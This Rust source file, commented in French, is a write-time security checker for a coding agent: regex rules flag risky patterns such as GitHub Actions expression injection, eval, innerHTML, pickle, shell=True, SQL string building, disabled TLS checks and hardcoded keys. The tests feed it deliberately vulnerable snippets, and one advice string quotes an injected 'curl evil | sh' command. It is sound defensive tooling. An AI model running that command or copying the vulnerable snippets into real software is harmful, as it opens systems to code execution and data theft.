//! Garde-fou de sécurité à l'écriture, l'équivalent gratuit du plugin
//! `security-guidance` de Claude Code : quand l'agent écrit un motif risqué
//! (injection dans un workflow GitHub, `eval`, `innerHTML`, `pickle`, requête
//! SQL composée, secret en clair…), une remarque est ajoutée au résultat de
//! l'écriture pour qu'il la reconsidère. L'écriture a bien lieu : la remarque
//! guide, elle ne bloque pas.
//!
//! Une règle n'est signalée qu'une fois par fichier et par session. Réglage
//! `"securityGuidance": false` ou `CLAW_SECURITY_GUIDANCE=0` pour la couper.

use std::collections::BTreeSet;
use std::fmt::Write as _;
use std::sync::{Mutex, OnceLock};

use regex::Regex;

struct Rule {
    id: &'static str,
    /// Fichiers concernés (selon le chemin), toutes les règles sinon.
    applies_to: fn(&str) -> bool,
    pattern: &'static str,
    /// Une ligne qui contient l'un de ces textes n'est pas signalée.
    unless: &'static [&'static str],
    advice: &'static str,
}

fn any_file(_: &str) -> bool {
    true
}

/// Extension du fichier, en minuscules.
fn extension(path: &str) -> String {
    std::path::Path::new(path)
        .extension()
        .and_then(std::ffi::OsStr::to_str)
        .unwrap_or_default()
        .to_ascii_lowercase()
}

fn workflow_file(path: &str) -> bool {
    path.replace('\\', "/").contains(".github/workflows/")
        && matches!(extension(path).as_str(), "yml" | "yaml")
}

fn javascript_file(path: &str) -> bool {
    matches!(
        extension(path).as_str(),
        "js" | "jsx" | "ts" | "tsx" | "mjs" | "cjs" | "vue" | "svelte" | "html"
    )
}

fn python_file(path: &str) -> bool {
    extension(path) == "py"
}

fn code_file(path: &str) -> bool {
    !matches!(extension(path).as_str(), "md" | "txt" | "rst")
}

const RULES: &[Rule] = &[
    Rule {
        id: "github-actions-injection",
        applies_to: workflow_file,
        pattern: r"\$\{\{\s*(github\.event\.(issue|comment|pull_request|review|review_comment|discussion|commits|head_commit|pages)[\w.\[\]*]*|github\.head_ref)\s*\}\}",
        unless: &[],
        advice: "a workflow expression built from user-controlled event data (titles, bodies, comments, branch names). Used inside `run:` it is substituted into the shell script before it runs: a title such as `\"; curl evil | sh; \"` executes. Pass the value through `env:` and use the shell variable (\"$TITLE\") instead.",
    },
    Rule {
        id: "child-process-exec",
        applies_to: javascript_file,
        pattern: r"\b(exec|execSync)\s*\(\s*(`[^`]*\$\{|[^)]*\+)",
        unless: &[],
        advice: "`exec`/`execSync` with a command built from variables runs it through a shell: shell metacharacters in the data become commands. Prefer `execFile`/`spawn` with an argument array, or validate the input strictly.",
    },
    Rule {
        id: "new-function",
        applies_to: javascript_file,
        pattern: r"\bnew\s+Function\s*\(",
        unless: &[],
        advice: "`new Function(...)` compiles a string into code, like `eval`: any untrusted part of the string becomes executable. Use a lookup table or a parser instead.",
    },
    Rule {
        id: "eval",
        applies_to: code_file,
        pattern: r"(^|[^\w.])eval\s*\(",
        unless: &[],
        advice: "`eval` runs a string as code: anything an attacker can put in that string is executed. Use a safe parser (`JSON.parse`, `ast.literal_eval`) or explicit logic.",
    },
    Rule {
        id: "dangerously-set-inner-html",
        applies_to: javascript_file,
        pattern: r"dangerouslySetInnerHTML",
        unless: &[],
        advice: "`dangerouslySetInnerHTML` inserts raw HTML: untrusted content becomes a cross-site scripting (XSS) hole. Render text normally, or sanitize with a vetted library (DOMPurify) first.",
    },
    Rule {
        id: "document-write",
        applies_to: javascript_file,
        pattern: r"document\.write(ln)?\s*\(",
        unless: &[],
        advice: "`document.write` injects raw HTML into the page (XSS risk with any dynamic content) and blocks rendering. Build DOM nodes or set `textContent` instead.",
    },
    Rule {
        id: "inner-html",
        applies_to: javascript_file,
        pattern: r"\.(innerHTML|outerHTML)\s*\+?=\s*[^=\s]",
        unless: &[],
        advice: "assigning `innerHTML`/`outerHTML` parses the string as HTML: untrusted data in it is a cross-site scripting (XSS) hole. Use `textContent` for text, or sanitize the HTML first.",
    },
    Rule {
        id: "pickle",
        applies_to: python_file,
        pattern: r"\b(pickle|cPickle|dill)\.loads?\s*\(",
        unless: &[],
        advice: "unpickling runs code chosen by whoever wrote the data: never load pickles from untrusted sources (uploads, network, user files). Use JSON or another data-only format.",
    },
    Rule {
        id: "os-system",
        applies_to: python_file,
        pattern: r"\bos\.(system|popen)\s*\(",
        unless: &[],
        advice: "`os.system`/`os.popen` run the string through a shell: variables in it can inject commands. Use `subprocess.run([...])` with an argument list and no shell.",
    },
    Rule {
        id: "subprocess-shell",
        applies_to: python_file,
        pattern: r"\bsubprocess\.\w+\([^)]*shell\s*=\s*True",
        unless: &[],
        advice: "`shell=True` passes the command through a shell: any variable data in it can inject commands. Pass an argument list without `shell=True`.",
    },
    Rule {
        id: "yaml-load",
        applies_to: python_file,
        pattern: r"\byaml\.load\s*\(",
        unless: &["SafeLoader", "BaseLoader"],
        advice: "`yaml.load` without `SafeLoader` can build arbitrary Python objects from the document (code execution with untrusted YAML). Use `yaml.safe_load`.",
    },
    Rule {
        id: "sql-concatenation",
        applies_to: code_file,
        pattern: r#"(?i)\b(execute|executemany|query|raw|exec_query)\s*\(\s*(f["']|["'][^"']*\b(select|insert|update|delete)\b[^"']*["']\s*(\+|%|\.format))"#,
        unless: &[],
        advice: "an SQL query assembled from strings: data placed in it can change the query (SQL injection). Use parameterized queries (placeholders and a separate parameter list).",
    },
    Rule {
        id: "tls-verification-off",
        applies_to: code_file,
        pattern: r"verify\s*=\s*False|rejectUnauthorized\s*:\s*false|InsecureSkipVerify\s*:\s*true|danger_accept_invalid_certs\s*\(\s*true",
        unless: &[],
        advice: "TLS certificate verification is turned off: anyone on the network path can read or alter the traffic. Keep verification on; for a private CA, configure its certificate instead.",
    },
    Rule {
        id: "hardcoded-secret",
        applies_to: any_file,
        pattern: r"AKIA[0-9A-Z]{16}|-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----|\bghp_[A-Za-z0-9]{36}\b|\bgithub_pat_[A-Za-z0-9_]{40,}|\bsk-or-v1-[a-f0-9]{32,}|\bsk-(ant-|proj-)?[A-Za-z0-9_-]{32,}|\bxox[baprs]-[A-Za-z0-9-]{10,}",
        unless: &[],
        advice: "what looks like a real secret (API key, token or private key) written into a file. Secrets in files end up in git history and logs: read them from an environment variable or a secret store, and rotate this one if it is real.",
    },
];

fn compiled() -> &'static Vec<Option<Regex>> {
    static COMPILED: OnceLock<Vec<Option<Regex>>> = OnceLock::new();
    COMPILED.get_or_init(|| {
        RULES
            .iter()
            .map(|rule| Regex::new(rule.pattern).ok())
            .collect()
    })
}

fn already_warned() -> &'static Mutex<BTreeSet<String>> {
    static WARNED: OnceLock<Mutex<BTreeSet<String>>> = OnceLock::new();
    WARNED.get_or_init(|| Mutex::new(BTreeSet::new()))
}

/// Le garde-fou est actif (réglage `securityGuidance`, `CLAW_SECURITY_GUIDANCE`).
#[must_use]
pub fn enabled() -> bool {
    if let Ok(value) = std::env::var("CLAW_SECURITY_GUIDANCE") {
        return !matches!(value.trim(), "0" | "false" | "off");
    }
    std::env::current_dir()
        .ok()
        .and_then(|cwd| crate::ConfigLoader::default_for(cwd).load().ok())
        .and_then(|config| {
            config
                .get("securityGuidance")
                .and_then(crate::json::JsonValue::as_bool)
        })
        .unwrap_or(true)
}

/// Règles qui trouvent un motif risqué dans `text` écrit dans `path` (sans
/// tenir compte des avertissements déjà donnés).
#[must_use]
pub fn matching_rules(path: &str, text: &str) -> Vec<&'static str> {
    let lowered = path.to_lowercase();
    RULES
        .iter()
        .zip(compiled())
        .filter(|(rule, _)| (rule.applies_to)(&lowered))
        .filter(|(rule, regex)| {
            regex.as_ref().is_some_and(|regex| {
                text.lines().any(|line| {
                    regex.is_match(line) && !rule.unless.iter().any(|safe| line.contains(safe))
                })
            })
        })
        .map(|(rule, _)| rule.id)
        .collect()
}

/// Remarque à ajouter au résultat de l'écriture de `text` dans `path`, une
/// fois par fichier et par règle ; `None` sans motif risqué nouveau.
#[must_use]
pub fn review_write(path: &str, text: &str) -> Option<String> {
    if text.is_empty() || !enabled() {
        return None;
    }
    let matches = matching_rules(path, text);
    if matches.is_empty() {
        return None;
    }
    let mut warned = already_warned()
        .lock()
        .unwrap_or_else(std::sync::PoisonError::into_inner);
    let fresh: Vec<&Rule> = RULES
        .iter()
        .filter(|rule| matches.contains(&rule.id))
        .filter(|rule| warned.insert(format!("{path}\u{0}{}", rule.id)))
        .collect();
    if fresh.is_empty() {
        return None;
    }
    let mut note = format!(
        "[Claw security] The file was written, but {path} now contains risky code. Check each point; if the input is trusted or already handled, say why, otherwise fix it now:"
    );
    for rule in fresh {
        let _ = write!(note, "\n- {}: {}", rule.id, rule.advice);
    }
    Some(note)
}

#[cfg(test)]
mod tests {
    use super::{matching_rules, review_write};

    #[test]
    fn risky_patterns_are_found_where_they_matter() {
        assert_eq!(
            matching_rules(
                ".github/workflows/triage.yml",
                "run: echo \"${{ github.event.issue.title }}\""
            ),
            vec!["github-actions-injection"]
        );
        // L'expression passée par `env:` reste signalée (c'est voulu : une
        // remarque par fichier) mais un contexte sûr ne l'est pas.
        assert!(
            matching_rules(".github/workflows/ci.yml", "run: echo ${{ github.sha }}").is_empty()
        );
        assert_eq!(
            matching_rules("src/app.js", "el.innerHTML = data;"),
            vec!["inner-html"]
        );
        assert!(matching_rules("src/app.js", "if (el.innerHTML == '') {}").is_empty());
        assert_eq!(
            matching_rules("tool.py", "data = pickle.loads(blob)"),
            vec!["pickle"]
        );
        assert_eq!(
            matching_rules("tool.py", "subprocess.run(cmd, shell=True)"),
            vec!["subprocess-shell"]
        );
        assert_eq!(
            matching_rules("tool.py", "conf = yaml.load(text)"),
            vec!["yaml-load"]
        );
        assert!(
            matching_rules("tool.py", "conf = yaml.load(text, Loader=yaml.SafeLoader)").is_empty()
        );
        assert_eq!(
            matching_rules(
                "db.py",
                "cur.execute(f\"SELECT * FROM users WHERE id = {uid}\")"
            ),
            vec!["sql-concatenation"]
        );
        assert_eq!(
            matching_rules("db.js", "db.query(\"SELECT * FROM t WHERE id = \" + id)"),
            vec!["sql-concatenation"]
        );
        assert!(
            matching_rules("db.py", "cur.execute(\"SELECT 1 WHERE id = ?\", (uid,))").is_empty()
        );
        assert_eq!(
            matching_rules("run.js", "exec(`git log ${branch}`)"),
            vec!["child-process-exec"]
        );
        assert_eq!(
            matching_rules("calc.js", "const value = eval(input);"),
            vec!["eval"]
        );
        assert!(matching_rules("calc.js", "model.eval()").is_empty());
        assert_eq!(
            matching_rules("client.py", "requests.get(url, verify=False)"),
            vec!["tls-verification-off"]
        );
        assert_eq!(
            matching_rules(".env.example", "KEY=AKIAABCDEFGHIJKLMNOP"),
            vec!["hardcoded-secret"]
        );
        // La documentation peut citer un motif sans danger.
        assert!(matching_rules("README.md", "never call eval(input)").is_empty());
        assert!(matching_rules("src/lib.rs", "let total = a + b;").is_empty());
    }

    #[test]
    fn a_rule_is_reported_once_per_file() {
        let _env = crate::test_env_lock();
        std::env::remove_var("CLAW_SECURITY_GUIDANCE");
        let path = "garde-fou-essai/page.js";
        let note = review_write(path, "box.innerHTML = html;").expect("remarque");
        assert!(
            note.starts_with("[Claw security]") && note.contains("inner-html"),
            "{note}"
        );
        assert_eq!(review_write(path, "other.innerHTML = more;"), None);
        assert!(review_write("garde-fou-essai/autre.js", "x.innerHTML = y;").is_some());
        std::env::set_var("CLAW_SECURITY_GUIDANCE", "0");
        assert_eq!(
            review_write("garde-fou-essai/coupe.js", "x.innerHTML = y;"),
            None
        );
        std::env::remove_var("CLAW_SECURITY_GUIDANCE");
    }
}
